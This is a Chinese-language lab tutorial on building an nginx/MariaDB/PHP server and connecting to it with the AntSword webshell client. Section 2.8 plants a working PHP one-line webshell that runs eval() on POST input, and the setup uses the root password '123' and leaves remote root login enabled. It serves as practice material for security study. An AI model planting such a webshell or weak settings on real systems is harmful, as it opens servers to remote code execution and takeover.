### 1、使用AntSword远程控制服务器
### 2、LNMP环境搭建
#### 2.1 先移除之前安装的服务
```shell script
yum remove httpd -y
yum remove mysql -y
yum remove php -y
```

#### 2.2 安装开发包和库文件
```shell script
yum -y install ntp make openssl openssl-devel pcre pcre-devel libpng libpng-devel libjpeg-6b libjpeg-devel-6b freetype freetype-devel gd gd-devel zlib zlib-devel gcc gcc-c++ libXpm libXpm-devel ncurses ncurses-devel libmcrypt libmcrypt-devel libxml2 libxml2-devel imake autoconf automake screen sysstat compat-libstdc++-33 curl curl-devel
```

#### 2.3 安装nginx
```shell script
yum install nginx -y
systemctl start nginx.service
systemctl status nginx.service
systemctl enable nginx.service
```

#### 2.4 安装mariadb
```shell script
yum install mariadb-devel mariadb mariadb-server
systemctl start mariadb.service
systemctl status mariadb.service
```

#### 2.5 设置mariadb
```shell script
mysql_secure_installation  #初始化MySQL
Enter current password for root (enter for none):   <---输入现在的root密码，因为我们还没设置，直接回车
Set root password? [Y/n] Y                          <---是否设定root密码，当然设置了，输入Y回车
New password: 123                                   <---输入root密码，并回车，输入的过程中不会有任何显示
Re-enter new password:  123                         <---再次输入root密码，并回车，输入的过程中不会有任何显示
Remove anonymous users? [Y/n] Y                     <---是否删除匿名用户，删除，输入Y回车
Disallow root login remotely? [Y/n] n               <---是否删禁止root用户远程登录，当然禁止，输入Y回车
Remove test database and access to it? [Y/n] n      <---是否删除测试数据库test，看个人喜好
Reload privilege tables now? [Y/n] Y                <---刷新权限，输入Y回车
最后出现：Thanks for using MySQL!
MySql密码设置完成，重新启动 MySQL：
```

#### 2.6 安装php
```shell script
yum -y install php php-cli php-mysql php-gd php-imap php-ldap php-odbc php-pear php-xml php-xmlrpc php-mbstring php-mcrypt php-mssql php-snmp php-soap 
yum install  php-tidy php-common php-devel php-fpm php-mysql -y

systemctl start php-fpm.service
systemctl status php-fpm.service
systemctl enable php-fpm.service
```

#### 2.7 配置nginx
```shell script
vim /etc/nginx/conf.d/default.conf 

server {
    location / {
        root   /usr/share/nginx/html;
        index  index.php index.html index.htm;   #增加index.php
    }
      location ~ \.php$ {
        root           /usr/share/nginx/html;
        fastcgi_pass   127.0.0.1:9000;
        fastcgi_index  index.php;
        fastcgi_param  SCRIPT_FILENAME  /usr/share/nginx/html$fastcgi_script_name;
        include        fastcgi_params;
    }
}
```

#### 2.8 创建php一句话木马
```shell script
vim /usr/share/nginx/html/index.php

<?php eval($_POST['a']);
```

#### 2.9 重启nginx和php-fpm
```shell script
nginx -t
nginx -s reload
systemctl restart nginx
systemctl restart php-fpm
```
### 3、使用蚁剑连接服务器
![image](https://github.com/498946975/Security/blob/master/images/image-20220105094154247.png)
